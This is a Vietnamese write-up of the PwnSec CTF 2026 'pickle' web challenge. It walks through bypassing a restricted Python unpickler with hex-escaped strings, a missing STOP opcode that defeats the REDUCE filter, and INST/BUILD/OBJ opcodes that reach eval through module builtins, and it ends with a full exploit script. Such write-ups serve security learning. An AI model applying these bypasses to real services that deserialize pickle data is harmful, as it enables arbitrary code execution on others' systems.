# Write-up Chi Tiết: `pickle` — PwnSec CTF 2026

- **Tên bài:** `pickle`
- **Thể loại:** Web Exploitation / Python Insecure Deserialization
- **Tác giả:** `C0uZ_Gh0sT`
- **Mức độ:** Medium / Hard
- **Flag:** `pwnsec{ce3a3177fb14adae}`

---

## 📑 Mục Lục
1. [Bước 1: Khảo sát ứng dụng & Nhận diện mục tiêu](#bước-1-khảo-sát-ứng-dụng--nhận-diện-mục-tiêu)
2. [Bước 2: Phân tích mã nguồn và các hàng rào bảo mật](#bước-2-phân-tích-mã-nguồn-và-các-hàng-rào-bảo-mật)
3. [Bước 3: Phương án Bypass từng lớp bảo vệ](#bước-3-phương-án-bypass-từng-lớp-bảo-vệ)
4. [Bước 4: Xây dựng Payload Pickle Bytecode thủ công](#bước-4-xây-dựng-payload-pickle-bytecode-thủ-công)
5. [Bước 5: Viết Exploit Script & Thu thập Flag](#bước-5-viết-exploit-script--thu-thập-flag)
6. [Tổng kết & Kiến thức cốt lõi](#tổng-kết--kiến-thức-cốt-lõi)

---

## Bước 1: Khảo sát ứng dụng & Nhận diện mục tiêu

Khi bắt đầu thử thách trên hệ thống PwnSec CTF, ta nhận được thông tin:
- Tên bài: `pickle`
- File đính kèm: `pickle.zip` (mật khẩu: `infected`).
- Một instance web được khởi chạy qua giao thức HTTP.

![Giao diện thử thách pickle trên PwnSec CTF](../images/pickle_challenge.png)

Truy cập vào địa chỉ instance được cấp, ta thấy một ứng dụng web mang tên **Time Capsule (Cryo-Session Archive - node 07)**.
- Giao diện cung cấp một khung nhập `textarea` với nhãn `capsule payload - base64(pickle)`.
- Người dùng dán chuỗi Base64 của đối tượng Python pickle và bấm nút **"Restore capsule"**.
- Nếu payload được chấp nhận, hệ thống trả về kết quả trong mục `vault output`.
- Nếu có lỗi hoặc bị hệ thống bảo mật chặn, mục output sẽ thông báo `Rejected | Payload contains banned characters!` hoặc `Payload contains banned instruction: REDUCE`.

![Giao diện thực tế của Time Capsule giải nén cờ thành công](../images/pickle_flag_result.png)

---

## Bước 2: Phân tích mã nguồn và các hàng rào bảo mật

Giải nén file `pickle.zip`, ta có cấu trúc thư mục:
```text
challenge/
├── Dockerfile
├── flag.txt
├── sessionstore.py
├── static/
│   ├── app.js
│   └── style.css
├── templates/
│   └── index.html
└── webapp.py
```

### 1. File `Dockerfile`
```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir flask gunicorn \
    && groupadd --system ctf \
    && useradd --system --gid ctf --no-create-home --shell /usr/sbin/nologin ctf
WORKDIR /app
COPY --chown=root:root webapp.py sessionstore.py /app/
COPY --chown=root:root flag.txt /app/flag.txt
...
USER ctf
CMD ["gunicorn", "-w", "2", "-b", "0.0.0.0:9999", "webapp:app"]
```
$\rightarrow$ Môi trường là **Python 3.12**, file cờ nằm tại `/app/flag.txt` cùng thư mục làm việc của webapp.

### 2. File `webapp.py`
```python
import base64
import os
import io
import pickle
import pickletools
from flask import Flask, jsonify, render_template, request
import sessionstore

BANNED_PATTERNS = [
    b".",
    b"os", b"system", b"popen", b"subprocess", b"commands",
    b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag"
]
BANNED_INSTRUCTION = "REDUCE"
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError("module %r is not allowed" % module)
        return super().find_class(module, name)

def check(data):
    for pattern in BANNED_PATTERNS:
        if pattern in data:
            raise ValueError("Payload contains banned characters!")
    out = io.StringIO()
    try:
        pickletools.dis(data, out=out)
        disassembled = out.getvalue()
        if BANNED_INSTRUCTION in disassembled:
            raise ValueError("Payload contains banned instruction: %s" % BANNED_INSTRUCTION)
    except Exception:
        disassembled = "Error!"
    return disassembled

def restore(raw_b64):
    import contextlib
    data = base64.b64decode(raw_b64)
    disassembled = check(data)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            RestrictedUnpickler(io.BytesIO(data)).load()
        except Exception:
            pass
    return buf.getvalue(), disassembled
```

### 3. File `sessionstore.py`
```python
class Capsule:
    def __init__(self, owner="guest"):
        self.owner = owner
        self.cache = {}

    def __repr__(self):
        return "<Capsule owner=%r fields=%s>" % (self.owner, list(self.cache))

def render(record, key):
    return record.cache[key]

def new_capsule(owner="guest"):
    return Capsule(owner)
```

---

## Bước 3: Phương án Bypass từng lớp bảo vệ

### Lớp 1: Bypass Blacklist chuỗi `BANNED_PATTERNS`
- **Rào cản:** Payload raw byte bị cấm chứa dấu chấm `b"."` và các chuỗi nguy hiểm như `b"flag"`, `b"eval"`, `b"os"`.
- **Giải pháp:**
  - Trong cấu trúc pickle, opcode `S` (STRING) cho phép biểu diễn chuỗi ký tự với mã hex escape dạng `\x..`.
  - Chuỗi `'eval'` $\rightarrow$ `S'\x65\x76\x61\x6c'\n`
  - Chuỗi `'flag.txt'` $\rightarrow$ `S'fl\x61g\x2etxt'\n`
  - Đoạn code Python `print(open("flag.txt").read())` hoàn toàn được chuyển thành chuỗi gồm các ký tự hex escape `\x..`.
  - Kết quả: **Không một byte nào trong payload vi phạm blacklist!**

### Lớp 2: Vô hiệu hóa bộ lọc Opcode `REDUCE`
- **Rào cản:** Hàm `check()` dùng `pickletools.dis()` phân tích disassembled instructions và chặn nếu xuất hiện từ khóa `"REDUCE"`.
- **Giải pháp:**
  - Vì byte `b"."` bị cấm trong `BANNED_PATTERNS`, ta **không đưa opcode `STOP` (`b'.'`)** vào cuối payload.
  - Khi không có opcode `STOP`, `pickletools.dis()` phân tích đến cuối file sẽ phát sinh lỗi:
    ```text
    ValueError: pickle exhausted before seeing STOP
    ```
  - Trong hàm `check()`:
    ```python
    try:
        pickletools.dis(data, out=out)
        disassembled = out.getvalue()
        if BANNED_INSTRUCTION in disassembled:
            raise ValueError(...)
    except Exception:
        disassembled = "Error!"
    return disassembled
    ```
    Khối `except Exception:` bắt ngoại lệ này và gán `disassembled = "Error!"`. Câu lệnh `if BANNED_INSTRUCTION in disassembled` **bị bỏ qua hoàn toàn**!
  - Trong hàm `restore()`, đối tượng unpickler vẫn nạp và thực thi các instruction trước đó. Khi đến cuối stream và gặp `EOFError`, khối `try...except Exception: pass` sẽ nuốt lỗi này mà không làm crash server. Bất kỳ kết quả nào đã được in ra `stdout` vẫn được lưu trọn vẹn vào buffer.

### Lớp 3: Thực thi mã tùy ý mà không dùng `REDUCE`
- **Rào cản:** `find_class` chỉ cho phép nạp từ module `sessionstore` hoặc `collections`. Không thể trực tiếp import `os` hay `builtins`.
- **Giải pháp:**
  1. Trong module `sessionstore`, luôn tồn tại sẵn thuộc tính `sessionstore.__builtins__`. Ta có thể lấy dictionary này bằng opcode `GLOBAL` (`csessionstore\n__builtins__\n`).
  2. Tạo một đối tượng `Capsule` bằng opcode `INST` (`isessionstore\nCapsule\n`).
  3. Dùng opcode `BUILD` (`b`) để nạp state `{'cache': sessionstore.__builtins__}` vào đối tượng `Capsule`. Lúc này, `capsule.cache` chính là toàn bộ các hàm built-in của Python!
  4. Hàm `sessionstore.render(record, key)` trả về `record.cache[key]`. Dùng opcode `INST` (`i`) gọi `sessionstore.render(capsule, 'eval')` $\rightarrow$ Kết quả trả về chính là hàm **`eval`**!
  5. Gọi hàm `eval` bằng opcode `OBJ` (`o`) với tham số là chuỗi code `print(open("flag.txt").read())`.
  6. Hàm `print()` đẩy nội dung file `flag.txt` ra `stdout`, được `contextlib.redirect_stdout(buf)` ghi nhận và trả về qua HTTP response JSON.

---

## Bước 4: Xây dựng Payload Pickle Bytecode thủ công

Chi tiết luồng thực thi bytecode của payload:

| Thứ tự | Opcode | Ý nghĩa chi tiết |
|---|---|---|
| 1 | `(` | Đặt dấu `MARK` trên ngăn xếp. |
| 2 | `isessionstore\nCapsule\n` | `INST`: Khởi tạo `sessionstore.Capsule()`. Ngăn xếp: `[capsule_obj]`. |
| 3 | `(` | Đặt dấu `MARK` để tạo dictionary. |
| 4 | `S'cache'\n` | Đẩy khóa `'cache'`. |
| 5 | `csessionstore\n__builtins__\n` | `GLOBAL`: Đẩy giá trị `sessionstore.__builtins__`. |
| 6 | `d` | `DICT`: Tạo `{ 'cache': sessionstore.__builtins__ }`. |
| 7 | `b` | `BUILD`: Gọi `capsule_obj.__dict__.update(state)`. `capsule_obj.cache` bây giờ là builtins! |
| 8 | `p0\n` | `PUT 0`: Lưu `capsule_obj` vào memo vị trí số `0`. |
| 9 | `0` | `POP`: Loại bỏ phần tử thừa trên đỉnh ngăn xếp. |
| 10 | `(` | Đặt dấu `MARK` cho opcode `OBJ` (`o`). |
| 11 | `(` | Đặt dấu `MARK` cho opcode `INST` (`i`). |
| 12 | `g0\n` | `GET 0`: Nạp `capsule_obj` từ memo 0 vào ngăn xếp. |
| 13 | `S'\x65\x76\x61\x6c'\n` | Đẩy chuỗi `'eval'` (đã escape hex). |
| 14 | `isessionstore\nrender\n` | `INST`: Gọi `sessionstore.render(capsule_obj, 'eval')` $\rightarrow$ Trả về hàm `eval`! |
| 15 | `S'\x70\x72\x69...'\n` | Đẩy mã cần thực thi `'print(open("flag.txt").read())'` (đã escape hex). |
| 16 | `o` | `OBJ`: Gọi `eval(code)` $\rightarrow$ Flag được đọc và in ra stdout. |

---

## Bước 5: Viết Exploit Script & Thu thập Flag

Lưu script sau vào file `exploit_pickle.py`:

```python
import base64
import json
import ssl
import urllib.request

# Bước 1: Chuẩn bị chuỗi code thực thi và escape hex
eval_str = "".join(f"\\x{b:02x}" for b in b"eval")
code = 'print(open("flag.txt").read())'
code_str = "".join(f"\\x{b:02x}" for b in code.encode())

# Bước 2: Tạo mảng byte chứa các instruction pickle
p = bytearray()
# Tạo Capsule
p.extend(b"(")
p.extend(b"isessionstore\nCapsule\n")
# BUILD cache = __builtins__
p.extend(b"(")
p.extend(b"S'cache'\n")
p.extend(b"csessionstore\n__builtins__\n")
p.extend(b"d")
p.extend(b"b")
# Lưu vào memo 0 và pop
p.extend(b"p0\n")
p.extend(b"0")
# Gọi render lấy eval
p.extend(b"(")
p.extend(b"(")
p.extend(b"g0\n")
p.extend(f"S'{eval_str}'\n".encode())
p.extend(b"isessionstore\nrender\n")
# Gọi eval(code) bằng OBJ
p.extend(f"S'{code_str}'\n".encode())
p.extend(b"o")

# Bước 3: Mã hóa Base64
b64_payload = base64.b64encode(p).decode()
print("[*] Base64 Payload:\n", b64_payload)

# Bước 4: Gửi HTTP POST request tới instance
HOST = "bb5a527b7f5c2a59.chal.ctf.ae" # Thay bằng host instance đang chạy
url = f"https://{HOST}/restore"

req = urllib.request.Request(
    url,
    data=json.dumps({"payload": b64_payload}).encode("utf-8"),
    headers={"Content-Type": "application/json"},
)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

with urllib.request.urlopen(req, context=ctx) as resp:
    result = json.loads(resp.read().decode())
    print("\n[+] Phản hồi từ Server:")
    print("Disassembled :", result.get("disassembled"))
    print("Output       :", repr(result.get("output")))

print("\n" + "="*45)
print(f"[🎉] FLAG: {result.get('output').strip()}")
print("="*45)
```

Chạy script trên Terminal:

![Quá trình chạy script exploit_pickle.py trên Terminal](../images/pickle_terminal.png)

Kết quả in ra:
```text
{"disassembled":"Error!","ok":true,"output":"pwnsec{ce3a3177fb14adae}\n\n"}

=============================================
[🎉] FLAG: pwnsec{ce3a3177fb14adae}
=============================================
```

---

## Tổng kết & Kiến thức cốt lõi

1. **Pickle String Escaping:** Opcode `S` kế thừa cú pháp escape của Python literal string (`\x..`, `\0..`), là công cụ hữu hiệu để vượt qua các bộ lọc blacklist chuỗi trong raw data.
2. **Khai thác lỗi Parser:** Khi `pickletools.dis()` phân tích bytecode bị cắt cụt (không có opcode `STOP`), nó sẽ ném lỗi. Nếu code xử lý lỗi bằng cách gán giá trị mặc định mà không chặn request, ta có thể vô hiệu hóa toàn bộ khâu kiểm tra sau đó.
3. **Gọi hàm không cần `REDUCE`:** Opcode `INST` (`i`) và `OBJ` (`o`) cùng với `BUILD` (`b`) là các cơ chế hợp lệ trong pickle protocol 0-2 cho phép khởi tạo đối tượng, cập nhật thuộc tính và thực thi callable tùy ý.
